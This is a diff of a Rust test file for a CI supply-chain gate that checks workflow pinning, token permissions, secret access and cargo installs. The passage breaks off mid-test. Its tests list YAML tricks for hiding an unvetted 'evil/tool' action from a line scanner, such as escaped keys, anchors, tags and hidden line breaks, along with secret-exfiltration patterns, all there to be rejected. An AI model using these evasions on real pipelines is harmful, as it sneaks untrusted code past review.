@@ -1,12 +1,18 @@
 //! The supply-chain gate (ADR 0043, docs/supply-chain.md): what CI and a
 //! release execute is pinned, least-privileged and reachable only the way the
 //! documentation says, and every fuzz target is wired in. The Rust twin of
-//! Forge-Go's `supply_chain_test.go`; it reads the workflow, script and
-//! Dockerfile text, so it needs no YAML parser and no network.
+//! Forge-Go's `supply_chain_test.go`. It reads the workflow, script and
+//! Dockerfile text line by line, and parses every gated workflow with a YAML
+//! parser (yaml-rust2, a test-only dependency) to check that the line reader
+//! reads what YAML does; it needs no network.
 //!
-//! Each rule is a function from a file's text to its violations, so the
-//! `*_rejects_*` tests below can prove, on hand-written snippets, that every
-//! known bypass is caught and that the accepted spellings stay accepted.
+//! Each rule is a function from a file's text to its violations
+//! (`gate/rules.rs`), so the `*_rejects_*` tests below can prove, on
+//! hand-written snippets, that every known bypass is caught and that the
+//! accepted spellings stay accepted. The generated application's workflows
+//! are gated as rendered, for every `forge new` option, by forge-cli's
+//! `src/generate/supply_chain.rs` with the same rules; the template is read
+//! here too, all branches merged, as an extra check only.
 
 #![allow(clippy::unwrap_used, clippy::expect_used)]
 
@@ -14,6 +20,10 @@ use std::collections::BTreeSet;
 use std::fs;
 use std::path::{Path, PathBuf};
 use std::time::{SystemTime, UNIX_EPOCH};
+
+#[path = "gate/rules.rs"]
+mod rules;
+use rules::*;
 
 fn root() -> PathBuf {
     Path::new(env!("CARGO_MANIFEST_DIR")).join("../..")
@@ -89,659 +99,6 @@ fn workflows_and_local_actions() -> Vec<(String, String)> {
         files.push((relative.clone(), relative));
     }
     files
-}
-
-fn is_hex(text: &str, length: usize) -> bool {
-    text.len() == length
-        && text
-            .bytes()
-            .all(|byte| matches!(byte, b'0'..=b'9' | b'a'..=b'f'))
-}
-
-/// `owner/repo[/path]@<40 hex>`.
-fn is_pinned_action(reference: &str) -> bool {
-    let Some((name, commit)) = reference.split_once('@') else {
-        return false;
-    };
-    name.contains('/')
-        && name
-            .bytes()
-            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'-' | b'/'))
-        && is_hex(commit, 40)
-}
-
-/// `# vX`, `# vX.Y` or `# vX.Y.Z`, the version the commit was verified against.
-fn is_version_comment(comment: &str) -> bool {
-    let Some(version) = comment.trim().strip_prefix("# v") else {
-        return false;
-    };
-    is_numeric_version(version, 1..=3)
-}
-
-/// `X`, `X.Y` or `X.Y.Z` (as many parts as `parts` allows), digits only.
-fn is_numeric_version(version: &str, parts: std::ops::RangeInclusive<usize>) -> bool {
-    let split: Vec<&str> = version.split('.').collect();
-    parts.contains(&split.len())
-        && split
-            .iter()
-            .all(|part| !part.is_empty() && part.bytes().all(|byte| byte.is_ascii_digit()))
-}
-
-/// Whether `reference` ends in `@sha256:<64 hex>`.
-fn has_digest(reference: &str) -> bool {
-    reference
-        .rsplit_once("@sha256:")
-        .is_some_and(|(_, digest)| is_hex(digest, 64))
-}
-
-/// The references of a container image in `text` that start with `prefix`:
-/// up to the next whitespace, quote or backslash.
-fn image_references<'a>(text: &'a str, prefix: &str) -> Vec<&'a str> {
-    let mut found = Vec::new();
-    let mut rest = text;
-    while let Some(start) = rest.find(prefix) {
-        let tail = &rest[start..];
-        let end = tail
-            .find(|character: char| {
-                character.is_whitespace() || matches!(character, '"' | '\\' | '\'')
-            })
-            .unwrap_or(tail.len());
-        found.push(&tail[..end]);
-        rest = &tail[end..];
-    }
-    found
-}
-
-/// A YAML line split into its code and its comment: a `#` that starts the
-/// line or follows a space or a tab.
-fn split_comment(line: &str) -> (&str, &str) {
-    let bytes = line.as_bytes();
-    let position = bytes.iter().enumerate().position(|(index, byte)| {
-        *byte == b'#' && (index == 0 || matches!(bytes[index - 1], b' ' | b'\t'))
-    });
-    position.map_or((line, ""), |index| line.split_at(index))
-}
-
-fn indentation(line: &str) -> usize {
-    line.len() - line.trim_start_matches([' ', '\t']).len()
-}
-
-/// The values of every `key` in the code of a line, unquoted: block style
-/// (`key: x`, `- key: x`, `"key": x`, `key : x`) and flow style
-/// (`- { key: x, other: y }`). A flow value ends at `,` or `}`.
-fn key_values<'a>(code: &'a str, key: &str) -> Vec<&'a str> {
-    let mut found = Vec::new();
-    for (start, _) in code.match_indices(key) {
-        // What precedes the key, past an opening quote and blanks: the start
-        // of the line, a list dash, or a flow mapping's `{` or `,`.
-        let before = code[..start].trim_end_matches(['"', '\'']).trim_end();
-        if !(before.is_empty() || before.ends_with(['-', '{', ','])) {
-            continue;
-        }
-        let after = code[start + key.len()..]
-            .trim_start_matches(['"', '\''])
-            .trim_start();
-        let Some(value) = after.strip_prefix(':') else {
-            continue;
-        };
-        let value = value.split([',', '}']).next().unwrap_or_default();
-        found.push(value.trim().trim_matches(['"', '\'']));
-    }
-    found
-}
-
-/// The `uses: ./path` references of a workflow or action, without `./`.
-fn local_actions(text: &str) -> Vec<String> {
-    text.lines()
-        .flat_map(|line| key_values(split_comment(line).0, "uses"))
-        .filter_map(|reference| reference.strip_prefix("./"))
-        .map(|path| path.trim_end_matches('/').to_owned())
-        .collect()
-}
-
-/// Every action is `owner/repo[/path]@<40-hex commit> # vX.Y.Z`, every
-/// `docker://` action is pinned by digest, and no `uses:` escapes the check
-/// through flow style, an anchor or an alias. Local `./` actions are checked
-/// as files of their own (`workflows_and_local_actions`).
-fn pin_violations(name: &str, text: &str) -> Vec<String> {
-    let mut violations = Vec::new();
-    for (number, line) in text.lines().enumerate() {
-        let (code, comment) = split_comment(line);
-        for reference in key_values(code, "uses") {
-            if reference.starts_with("./") {
-                continue;
-            }
-            let pinned = match reference.strip_prefix("docker://") {
-                Some(image) => has_digest(image),
-                None => is_pinned_action(reference) && is_version_comment(comment),
-            };
-            if !pinned {
-                violations.push(format!(
-                    "{name}:{}: `{}` must be owner/repo@<40-hex commit> # vX.Y.Z, or docker://<image>@sha256:<digest>",
-                    number + 1,
-                    line.trim()
-                ));
-            }
-        }
-    }
-    violations
-}
-
-/// The lines of the step (list item) that line `index` belongs to: from its
-/// `- ` to the next line indented no deeper than that dash.
-fn step_lines<'a, 'b>(lines: &'b [&'a str], index: usize) -> &'b [&'a str] {
-    let own = indentation(lines[index]);
-    let start = (0..=index)
-        .rev()
-        .find(|&candidate| {
-            split_comment(lines[candidate])
-                .0
-                .trim_start()
-                .starts_with('-')
-                && indentation(lines[candidate]) <= own
-        })
-        .unwrap_or(index);
-    let dash = indentation(lines[start]);
-    let end = (start + 1..lines.len())
-        .find(|&candidate| {
-            !split_comment(lines[candidate]).0.trim().is_empty()
-                && indentation(lines[candidate]) <= dash
-        })
-        .unwrap_or(lines.len());
-    &lines[start..end]
-}
-
-/// Every `actions/checkout` step, in any spelling of the owner and name
-/// (GitHub resolves them case-insensitively), sets
-/// `persist-credentials: false` itself: the token stays out of .git/config,
-/// where later steps could read it.
-fn checkout_violations(name: &str, text: &str) -> Vec<String> {
-    let lines: Vec<&str> = text.lines().collect();
-    let mut violations = Vec::new();
-    for (index, line) in lines.iter().enumerate() {
-        let checkout = key_values(split_comment(line).0, "uses")
-            .iter()
-            .any(|reference| {
-                reference
-                    .split_once('@')
-                    .map_or(*reference, |(action, _)| action)
-                    .eq_ignore_ascii_case("actions/checkout")
-            });
-        if !checkout {
-            continue;
-        }
-        let persists = !step_lines(&lines, index).iter().any(|line| {
-            key_values(split_comment(line).0, "persist-credentials").contains(&"false")
-        });
-        if persists {
-            violations.push(format!(
-                "{name}:{}: this checkout step must set persist-credentials: false",
-                index + 1
-            ));
-        }
-    }
-    violations
-}
-
-/// A mapping entry `key: value` (the value may be empty), with the key
-/// unquoted; `None` for anything else, such as a shell line of a `run:` block.
-fn mapping_entry(content: &str) -> Option<(&str, &str)> {
-    let (key, value) = content.split_once(':')?;
-    let key = key.trim().trim_matches(['"', '\'']);
-    let plain = !key.is_empty()
-        && key
-            .bytes()
-            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_'));
-    (plain && (value.is_empty() || value.starts_with([' ', '\t']))).then_some((key, value.trim()))
-}
-
-/// The containers a workflow runs, as (line number, image): a service's
-/// `image:` (`services.<id>.image`), a job's `container.image`, the
-/// `container: <image>` shorthand, and the same in flow style. An `image:`
-/// anywhere else, such as an action input under a step's `with:` or a matrix
-/// entry (release.yml), is not a container.
-fn container_images(text: &str) -> Vec<(usize, String)> {
-    // The keys that enclose the current line, with their indentation.
-    let mut parents: Vec<(usize, String)> = Vec::new();
-    let mut found = Vec::new();
-    for (number, line) in text.lines().enumerate() {
-        let code = split_comment(line).0;
-        if code.trim().is_empty() {
-            continue;
-        }
-        let mut indent = indentation(code);
-        let mut content = code.trim();
-        // A list item's mapping starts after its dash, one level deeper.
-        if let Some(rest) = content
-            .strip_prefix('-')
-            .filter(|rest| rest.is_empty() || rest.starts_with([' ', '\t']))
-        {
-            while parents.last().is_some_and(|(depth, _)| *depth >= indent) {
-                parents.pop();
-            }
-            let item = rest.trim_start();
-            indent += content.len() - item.len();
-            content = item;
-        }
-        while parents.last().is_some_and(|(depth, _)| *depth >= indent) {
-            parents.pop();
-        }
-        let Some((key, value)) = mapping_entry(content) else {
-            continue;
-        };
-        let parent = parents.last().map(|(_, key)| key.as_str());
-        let grandparent = parents
-            .len()
-            .checked_sub(2)
-            .map(|index| parents[index].1.as_str());
-        let flow = value.starts_with('{');
-        let image =
-            key == "image" && (parent == Some("container") || grandparent == Some("services"));
-        let shorthand = key == "container" && !value.is_empty() && !flow;
-        if image || shorthand {
-            found.push((number + 1, value.trim_matches(['"', '\'']).to_owned()));
-        }
-        if flow && (matches!(key, "services" | "container") || parent == Some("services")) {
-            for image in key_values(value, "image") {
-                found.push((number + 1, image.to_owned()));
-            }
-        }
-        parents.push((indent, key.to_owned()));
-    }
-    found
-}
-
-fn container_violations(name: &str, text: &str) -> Vec<String> {
-    container_images(text)
-        .into_iter()
-        .filter(|(_, image)| !has_digest(image))
-        .map(|(number, image)| {
-            format!(
-                "{name}:{number}: service image or container `{image}` must be pinned by digest"
-            )
-        })
-        .collect()
-}
-
-/// The scopes a line of code grants `write` to, in block (`contents: write`)
-/// or flow style (`permissions: { contents: write }`), quoted or not.
-fn write_scopes(code: &str) -> Vec<String> {
-    let mut scopes = Vec::new();
-    for (position, _) in code.match_indices("write") {
-        let after = code[position + "write".len()..]
-            .trim_start_matches(['"', '\''])
-            .trim_start();
-        if !(after.is_empty() || after.starts_with([',', '}'])) {
-            continue;
-        }
-        let Some(before) = code[..position]
-            .trim_end_matches(['"', '\''])
-            .trim_end()
-            .strip_suffix(':')
-        else {
-            continue;
-        };
-        let before = before.trim_end().trim_end_matches(['"', '\'']);
-        let start = before
-            .rfind(|character: char| {
-                !(character.is_ascii_alphanumeric() || matches!(character, '-' | '_'))
-            })
-            .map_or(0, |index| index + 1);
-        scopes.push(before[start..].to_owned());
-    }
-    scopes
-}
-
-/// The only scopes any workflow may write are the release job's `id-token`
-/// and `packages`; checks, statuses, contents, actions... stay read.
-fn permission_violations(name: &str, text: &str, release: bool) -> Vec<String> {
-    let mut violations = Vec::new();
-    if !text.lines().any(|line| line.starts_with("permissions:")) {
-        violations.push(format!("{name}: no top-level permissions"));
-    }
-    if text.contains("pull_request_target") {
-        violations.push(format!(
-            "{name}: pull_request_target runs fork code with secrets"
-        ));
-    }
-    if text.contains("write-all") {
-        violations.push(format!("{name}: write access to everything"));
-    }
-    for (number, line) in text.lines().enumerate() {
-        for scope in write_scopes(split_comment(line).0) {
-            if !(release && matches!(scope.as_str(), "id-token" | "packages")) {
-                violations.push(format!(
-                    "{name}:{}: `{scope}: write` is not allowed",
-                    number + 1
-                ));
-            }
-        }
-    }
-    for permission in ["id-token: write", "packages: write"] {
-        let count = text.matches(permission).count();
-        if !((release && count == 1) || (!release && count == 0)) {
-            violations.push(format!("{name}: `{permission}` appears {count} times"));
-        }
-    }
-    violations
-}
-
-/// No workflow hands its secrets on wholesale or by computed name
-/// (`secrets[`, `toJSON(secrets)`, `join(secrets, ...)`, `{ x: secrets }`,
-/// `secrets: inherit`), in any case and spacing: expression contexts are
-/// case-insensitive. The only secret any workflow reads is the release job's
-/// token, spelled `secrets.GITHUB_TOKEN`.
-fn secret_violations(name: &str, text: &str, release: bool) -> Vec<String> {
-    let lower = text.to_ascii_lowercase();
-    let bytes = lower.as_bytes();
-    let mut violations = Vec::new();
-    for (position, _) in lower.match_indices("secrets") {
-        if position > 0
-            && (bytes[position - 1].is_ascii_alphanumeric() || bytes[position - 1] == b'_')
-        {
-            continue;
-        }
-        let rest = lower[position + "secrets".len()..].trim_start();
-        let inherit = rest
-            .strip_prefix(':')
-            .is_some_and(|value| value.trim_start().starts_with("inherit"));
-        if inherit || rest.starts_with(['[', ')', ',', '}']) {
-            let shown: String = text[position..].chars().take(24).collect();
-            violations.push(format!(
-                "{name}: `{shown}` reaches secrets outside the reviewed list"
-            ));
-        } else if rest.starts_with('.') {
-            // The reference as written: `secrets`, blanks, `.`, blanks, name.
-            let dot = lower.len() - rest.len();
-            let after_dot = &text[dot + 1..];
-            let name_start = dot + 1 + (after_dot.len() - after_dot.trim_start().len());
-            let name_end = text[name_start..]
-                .find(|character: char| {
-                    !(character.is_ascii_alphanumeric() || matches!(character, '.' | '_'))
-                })
-                .map_or(text.len(), |offset| name_start + offset);
-            let reference = &text[position..name_end];
-            if !(release && reference == "secrets.GITHUB_TOKEN") {
-                violations.push(format!("{name}: unexpected `{reference}`"));
-            }
-        }
-    }
-    violations
-}
-
-/// The one place outside the cargo-tool action that may install a cargo
-/// tool: release.yml builds from a clean cache, so it installs
-/// cargo-auditable itself, in this named step.
-const RELEASE_INSTALL: (&str, &str) = (".github/workflows/release.yml", "Install cargo-auditable");
-const TOOL_ACTION: &str = ".github/actions/cargo-tool/action.yml";
-
-/// The logical lines of a file: comments removed and `\`-continued lines
-/// joined, each with the index of its first physical line.
-fn logical_lines(text: &str) -> Vec<(usize, String)> {
-    let mut lines: Vec<(usize, String)> = Vec::new();
-    let mut continued = false;
-    for (index, line) in text.lines().enumerate() {
-        let code = split_comment(line).0.trim_end();
-        let (code, continues) = match code.strip_suffix('\\') {
-            Some(code) => (code, true),
-            None => (code, false),
-        };
-        match lines.last_mut() {
-            Some((_, joined)) if continued => {
-                joined.push(' ');
-                joined.push_str(code);
-            }
-            _ => lines.push((index, code.to_owned())),
-        }
-        continued = continues;
-    }
-    lines
-}
-
-/// The words of a logical line, with shell separators (`&&`, `||`, `;`,
-/// `|`, `$(`, `(`, `)`, backquotes) as words of their own.
-fn shell_words(code: &str) -> Vec<String> {
-    const SEPARATORS: [&str; 8] = ["&&", "||", "$(", ";", "|", "(", ")", "`"];
-    let mut spaced = String::with_capacity(code.len() * 2);
-    let mut rest = code;
-    while let Some(character) = rest.chars().next() {
-        match SEPARATORS
-            .iter()
-            .find(|separator| rest.starts_with(**separator))
-        {
-            Some(separator) => {
-                spaced.push_str(&format!(" {separator} "));
-                rest = &rest[separator.len()..];
-            }
-            None => {
-                spaced.push(character);
-                rest = &rest[character.len_utf8()..];
-            }
-        }
-    }
-    spaced.split_whitespace().map(str::to_owned).collect()
-}
-
-fn is_separator(word: &str) -> bool {
-    matches!(word, "&&" | "||" | "$(" | ";" | "|" | "(" | ")" | "`")
-}
-
-/// `cargo` in any spelling a shell runs: a path to it, `$CARGO` or
-/// `${CARGO...}`, quoted or not.
-fn is_cargo_program(word: &str) -> bool {
-    let word = word.trim_matches(['"', '\'']);
-    word == "cargo"
-        || word.ends_with("/cargo")
-        || word.starts_with("$CARGO")
-        || word.starts_with("${CARGO")
-}
-
-/// Whether a `cargo install --version` value is one exact `X.Y.Z` (an `=`
-/// requirement allowed): `^`, `>=`, `~`, `*` and partial versions resolve to
-/// whatever is newest.
-fn is_exact_version(value: &str) -> bool {
-    let value = value.trim_matches(['"', '\'']);
-    is_numeric_version(value.strip_prefix('=').unwrap_or(value), 3..=3)
-}
-
-/// One cargo command that installs, as found in a logical line.
-struct CargoInstall {
-    /// The logical line's first physical line.
-    line: usize,
-    /// The whole command: `cargo`, its options, `install`, its arguments.
-    words: Vec<String>,
-    /// Whether the logical line holds nothing but `run:` and this command.
-    alone: bool,
-}
-
-/// Every cargo command of a file that installs: a word `install` or
-/// `binstall` anywhere in a command whose program is cargo (options before
-/// the subcommand included). A cargo command that ends its line is read on
-/// into the next line, as a YAML-folded scalar would be.
-fn cargo_installs(text: &str) -> Vec<CargoInstall> {
-    let lines = logical_lines(text);
-    let mut found = Vec::new();
-    for (at, (line, code)) in lines.iter().enumerate() {
-        let words = shell_words(code);
-        for (position, word) in words.iter().enumerate() {
-            if !is_cargo_program(word) {
-                continue;
-            }
-            let mut command: Vec<String> = words[position..]
-                .iter()
-                .take_while(|word| !is_separator(word))
-                .cloned()
-                .collect();
-            let reaches_end = position + command.len() == words.len();
-            let only_options = command[1..]
-                .iter()
-                .all(|word| word.starts_with('-') || word.starts_with('+'));
-            if reaches_end && only_options {
-                // A YAML-folded scalar continues the command on the next
-                // line; a literal block starts a new one there. Read on only
-                // when the next line goes on with the subcommand.
-                if let Some((_, next)) = lines.get(at + 1) {
-                    let next: Vec<String> = shell_words(next)
-                        .into_iter()
-                        .take_while(|word| !is_separator(word))
-                        .collect();
-                    let subcommand = next.iter().find(|word| {
-                        !(word.starts_with('-') || word.starts_with('+') || word.contains('='))
-                    });
-                    if subcommand.is_some_and(|word| {
-                        matches!(word.trim_matches(['"', '\'']), "install" | "binstall")
-                    }) {
-                        command.extend(next);
-                    }
-                }
-            }
-            let installs = command[1..]
-                .iter()
-                .any(|word| matches!(word.trim_matches(['"', '\'']), "install" | "binstall"));
-            if installs {
-                let prefix = &words[..position];
-                let alone = (prefix.is_empty() || prefix == ["run:"] || prefix == ["-", "run:"])
-                    && position + command.len() == words.len();
-                found.push(CargoInstall {
-                    line: *line,
-                    words: command,
-                    alone,
-                });
-            }
-        }
-    }
-    found
-}
-
-/// Problems of an install at one of the two allowed sites: it must be a
-/// plain `cargo install <crate>` alone in its `run`, with one exact
-/// `--version` (the action's `"$VERSION"`, checked at each caller) and
-/// `--locked`, from crates.io.
-fn allowed_install_problems(install: &CargoInstall, in_tool_action: bool) -> Option<&'static str> {
-    let words: Vec<&str> = install.words.iter().map(String::as_str).collect();
-    if !install.alone || words.get(1) != Some(&"install") {
-        return Some(
-            "must be a plain `cargo install`, alone in its run, with no option before install",
-        );
-    }
-    let arguments = &words[2..];
-    let version =
-        arguments
-            .iter()
-            .enumerate()
-            .find_map(|(at, argument)| match argument.split_once('=') {
-                Some(("--version" | "--vers", value)) => Some(value),
-                _ if matches!(*argument, "--version" | "--vers") => arguments.get(at + 1).copied(),
-                _ => None,
-            });
-    let exact = version.is_some_and(|value| {
-        is_exact_version(value) || (in_tool_action && value == "\"$VERSION\"")
-    });
-    let source = arguments.iter().any(|argument| {
-        let flag = argument.split_once('=').map_or(*argument, |(flag, _)| flag);
-        matches!(
-            flag,
-            "--git" | "--path" | "--registry" | "--index" | "--config" | "-Z"
-        )
-    });
-    (!exact || !arguments.contains(&"--locked") || source)
-        .then_some("needs one exact --version X.Y.Z and --locked, from crates.io")
-}
-
-/// Cargo tools are installed only through the local cargo-tool action
-/// (exact version, cached under it) and in one reviewed release.yml step;
-/// any other install in a workflow or action is refused, however it is
-/// spelled: a path to cargo, `$CARGO`, options before `install`,
-/// `binstall`, `cargo-binstall`, a `CARGO_ALIAS_*` that renames `install`,
-/// a `\`-continued or folded line. Probes that would skip an install
-/// because some binary is already there (`command -v`, `which`, `hash`,
-/// `type`, file tests on `~/.cargo/bin`) are refused too, and a cargo-tool
-/// step needs an exact `version: X.Y.Z`. `relative` is the file's path in
-/// the repository.
-fn tool_install_violations(relative: &str, text: &str) -> Vec<String> {
-    let lines: Vec<&str> = text.lines().collect();
-    let in_tool_action = relative == TOOL_ACTION;
-    let release_step: Vec<usize> = if relative == RELEASE_INSTALL.0 {
-        lines
-            .iter()
-            .position(|line| key_values(split_comment(line).0, "name").contains(&RELEASE_INSTALL.1))
-            .map(|index| {
-                let step = step_lines(&lines, index);
-                let start = lines
-                    .iter()
-                    .position(|line| std::ptr::eq(*line, step[0]))
-                    .unwrap_or(index);
-                (start..start + step.len()).collect()
-            })
-            .unwrap_or_default()
-    } else {
-        Vec::new()
-    };
-    let mut violations = Vec::new();
-    for install in cargo_installs(text) {
-        let shown = install.words.join(" ");
-        let allowed = in_tool_action || release_step.contains(&install.line);
-        let problem = if allowed {
-            allowed_install_problems(&install, in_tool_action)
-        } else {
-            Some("cargo tools are installed only through .github/actions/cargo-tool")
-        };
-        if let Some(problem) = problem {
-            violations.push(format!(
-                "{relative}:{}: `{shown}`: {problem}",
-                install.line + 1
-            ));
-        }
-    }
-    for (index, line) in lines.iter().enumerate() {
-        let code = split_comment(line).0;
-        let words: Vec<&str> = code.split_whitespace().collect();
-        let mut refuse = |reason: &str| {
-            violations.push(format!(
-                "{relative}:{}: `{}`: {reason}",
-                index + 1,
-                line.trim()
-            ));
-        };
-        if words.iter().any(|word| {
-            let word = word.trim_matches(['"', '\'']);
-            word == "cargo-binstall" || word.ends_with("/cargo-binstall")
-        }) {
-            refuse("cargo-binstall installs prebuilt binaries");
-        }
-        if code.contains("CARGO_ALIAS_") {
-            refuse("a CARGO_ALIAS_* can rename install");
-        }
-        let flat = words.join(" ");
-        let probes = [
-            "command -v cargo-",
-            "which cargo-",
-            "hash cargo-",
-            "type cargo-",
-            "type -p cargo-",
-        ];
-        let file_test = [" -x ", " -f ", " -e ", " -s "]
-            .iter()
-            .any(|test| flat.contains(test))
-            && (flat.contains(".cargo/bin") || flat.contains("/cargo-"));
-        if probes.iter().any(|probe| flat.contains(probe)) || file_test {
-            refuse("a cached cargo tool is found by its version, not by a probe");
-        }
-        let tool = key_values(code, "uses")
-            .iter()
-            .any(|reference| reference.trim_end_matches('/') == "./.github/actions/cargo-tool");
-        if tool {
-            let exact = step_lines(&lines, index)
-                .iter()
-                .flat_map(|line| key_values(split_comment(line).0, "version"))
-                .next()
-                .is_some_and(|version| is_numeric_version(version, 3..=3));
-            if !exact {
-                refuse("the cargo-tool step needs an exact `version: X.Y.Z`");
-            }
-        }
-    }
-    violations
 }
 
 /// The release workflow runs only for `v*` tags, holds no permission by
@@ -871,6 +228,685 @@ fn actions_are_pinned_by_commit_with_their_version_in_a_comment() {
     }
 }
 
+const APP_CI_TEMPLATE: &str = "crates/forge-cli/templates/app/github/workflows/ci.yml.tmpl";
+
+/// The gated files as (name, text): the workflows, the local actions they
+/// reach and the generated-app CI template (markers blanked line-aligned).
+fn gated_files() -> Vec<(String, String)> {
+    let mut files: Vec<(String, String)> = workflows_and_local_actions()
+        .into_iter()
+        .map(|(name, relative)| (name, read(&relative)))
+        .collect();
+    files.push((
+        APP_CI_TEMPLATE.to_owned(),
+        blank_template_markers(&read(APP_CI_TEMPLATE)),
+    ));
+    files
+}
+
+#[test]
+fn a_yaml_parser_reads_the_gated_files_as_the_gate_does() {
+    for (name, text) in gated_files() {
+        assert_clean(&yaml_subset_violations(&name, &text));
+        assert_clean(&parser_violations(&name, &text));
+        assert_clean(&tree_violations(&name, &text, name == "release.yml"));
+    }
+}
+
+#[test]
+fn only_allowlisted_actions_are_used() {
+    let mut used = BTreeSet::new();
+    for (name, text) in gated_files() {
+        assert_clean(&allowlist_violations(&name, &text));
+        assert_clean(&yaml_subset_violations(&name, &text));
+        for line in text.lines() {
+            for reference in key_values(split_comment(line).0, "uses") {
+                used.extend(action_repository(reference));
+            }
+        }
+    }
+    // The list holds what is in use, nothing more.
+    for allowed in ALLOWED_ACTIONS {
+        assert!(
+            used.contains(allowed),
+            "{allowed} is allowlisted but unused"
+        );
+    }
+}
+
+/// What the gate refuses about a `uses:` line: an unlisted action, or a key
+/// it cannot read.
+fn uses_violations(text: &str) -> Vec<String> {
+    let mut violations = allowlist_violations("t.yml", text);
+    violations.extend(yaml_subset_violations("t.yml", &dedent(text)));
+    violations
+}
+
+/// A fragment moved left so that its least indented line starts at column
+/// 0, as a document root must.
+fn dedent(text: &str) -> String {
+    let margin = text
+        .split('\n')
+        .filter(|line| !line.trim().is_empty())
+        .map(indentation)
+        .min()
+        .unwrap_or(0);
+    text.split('\n')
+        .map(|line| line.get(margin..).unwrap_or(line.trim_start()))
+        .collect::<Vec<_>>()
+        .join("\n")
+}
+
+#[test]
+fn the_allowlist_rejects_unlisted_actions_however_pinned() {
+    for rejected in [
+        "      - uses: taiki-e/install-action@SHA # v2.62.1",
+        "      - uses: baptiste0928/cargo-install@SHA # v3.3.2",
+        "      - { uses: dtolnay/rust-toolchain@SHA } # v1",
+        "      - uses: actions-rs/cargo@SHA # v1.0.3",
+        "      - uses: actions/checkout-evil@SHA # v7.0.1",
+        "      - uses: docker://alpine@sha256:DIGEST",
+        "      - uses: checkout@SHA # v7",
+        "      - uses: actions/checkout/../../taiki-e/install-action@SHA # v2",
+        "      - uses: actions/checkout/./x@SHA # v7",
+        "      - uses: actions/checkout//x@SHA # v7",
+        // YAML spellings of the key that a line scanner would not see.
+        "      - \"u\\x73es\": taiki-e/install-action@SHA # v2",
+        "      - \"use\\s\": taiki-e/install-action@SHA # v2",
+        "      - ? uses\n        : taiki-e/install-action@SHA # v2",
+        "    steps: [uses: taiki-e/install-action@SHA] # v2",
+        "      - &k uses: taiki-e/install-action@SHA # v2",
+        "      - *k : taiki-e/install-action@SHA # v2",
+        "      - !!str uses: taiki-e/install-action@SHA # v2",
+        "    steps: [{name: x, !!str uses: taiki-e/install-action@SHA}] # v2",
+    ] {
+        let text = snippet(rejected);
+        assert!(!uses_violations(&text).is_empty(), "accepted: {text}");
+    }
+    for accepted in [
+        "      - uses: actions/checkout@SHA # v7.0.1",
+        "      - uses: Actions/Checkout@SHA # v7.0.1",
+        "      - uses: swatinem/RUST-CACHE@SHA # v2.9.2",
+        "      - uses: docker/build-push-action/subdir@SHA # v7",
+        "      - uses: ./.github/actions/cargo-tool",
+        "    steps: [uses: actions/checkout@SHA] # v7.0.1",
+        // Inside a block scalar, `*`, `&` and `!` are shell, not YAML.
+        "      - run: |\n          case \"$x\" in\n            *) echo \"!\" & wait ;;\n          esac\n      - uses: actions/checkout@SHA # v7.0.1",
+        "    branches: [main]\n    tags: [\"v*\"]",
+    ] {
+        assert_clean(&uses_violations(&snippet(accepted)));
+    }
+}
+
+#[test]
+fn the_yaml_subset_refuses_what_a_line_scanner_could_misread() {
+    let decoy = "      - uses: actions/checkout@SHA # v7.0.1";
+    for rejected in [
+        // Hidden line breaks: one line here, two for a YAML parser.
+        format!("{decoy}\r      - uses: evil/tool@main\n"),
+        format!("{decoy}\u{85}      - uses: evil/tool@main\n"),
+        format!("{decoy}\u{2028}      - uses: evil/tool@main\n"),
+        format!("{decoy}\u{2029}      - uses: evil/tool@main\n"),
+        format!("{decoy}\n\u{feff}      - uses: evil/tool@main\n"),
+        // Anchors, aliases, tags, explicit and merge keys anywhere.
+        "    steps: !!seq [ {\"u\\x73es\": evil/tool@main} ]\n".to_owned(),
+        "    steps: &s [ {uses: actions/checkout@SHA} ]\n".to_owned(),
+        "    steps: *s\n".to_owned(),
+        "      - <<: *base\n".to_owned(),
+        "      - name: x\n        with: !!map {a: b}\n".to_owned(),
+        "      - with: {a: &x b}\n".to_owned(),
+        "      - ? uses\n        : evil/tool@main\n".to_owned(),
+        // Flow collections that span lines, unclosed quotes.
+        "    steps: [\n      {uses: evil/tool@main} ]\n".to_owned(),
+        "    steps: [ {name: x},\n      uses: evil/tool@main ]\n".to_owned(),
+        "      - name: \"x\n        uses: evil/tool@main\"\n".to_owned(),
+        "      - \"u\\x73es\": evil/tool@main\n".to_owned(),
+    ] {
+        let text = snippet(&rejected);
+        assert!(
+            !yaml_subset_violations("t.yml", &dedent(&text)).is_empty(),
+            "accepted: {text:?}"
+        );
+    }
+    for accepted in [
+        "\u{feff}name: CI\non:\n  push:\n    branches: [main]\n    tags: [\"v*\"]\n",
+        "jobs:\n  x:\n    if: ${{ !cancelled() }}\n    steps:\n      - run: |\n          case \"$x\" in\n            *) echo \"!\" & wait ;;\n          esac\n          # deeper comment\n      - uses: actions/checkout@SHA # v7.0.1\n",
+        "      - run: echo \"a #b\" && echo it's\n      - name: 'it''s'\n        with: {a: b, c: [d, e]}\n",
+        "    if: >-\n      github.event_name == 'push'\n      && !cancelled()\n",
+        "on:\r\n  push:\r\n",
+    ] {
+        assert_clean(&yaml_subset_violations(
+            "t.yml",
+            &dedent(&snippet(accepted)),
+        ));
+    }
+    // The scanner reads every node of the real files, deep ones included:
+    // an anchor or a tag anywhere in them is found.
+    let ci = read(".github/workflows/ci.yml");
+    for (from, to) in [
+        (
+            "persist-credentials: false",
+            "persist-credentials: !!bool false",
+        ),
+        ("runs-on: ubuntu-latest", "runs-on: &runner ubuntu-latest"),
+        ("timeout-minutes: 60", "timeout-minutes: *minutes"),
+    ] {
+        let last = ci.rfind(from).expect("present");
+        let changed = format!("{}{to}{}", &ci[..last], &ci[last + from.len()..]);
+        assert!(
+            !yaml_subset_violations("ci.yml", &changed).is_empty(),
+            "the last `{from}` of ci.yml was not read"
+        );
+    }
+}
+
+#[test]
+fn the_parser_check_rejects_what_the_scanner_misreads() {
+    let checkout = "actions/checkout@SHA # v7.0.1";
+    for rejected in [
+        // R2: a quoted `#` is no comment.
+        "jobs:\n  a:\n    steps:\n      - {name: 'build #1', uses: evil/act@main}\n".to_owned(),
+        // R3: flow nesting after a quoted key with no blank.
+        "jobs:\n  b: {\"runs-on\":[ubuntu-latest], \"steps\":[{\"u\\x73es\": evil/act@main}]}\n"
+            .to_owned(),
+        "jobs:\n  b: {runs-on:[x], steps: [{uses: evil/act@main}]}\n".to_owned(),
+        // R4: document markers, directives and an indented root.
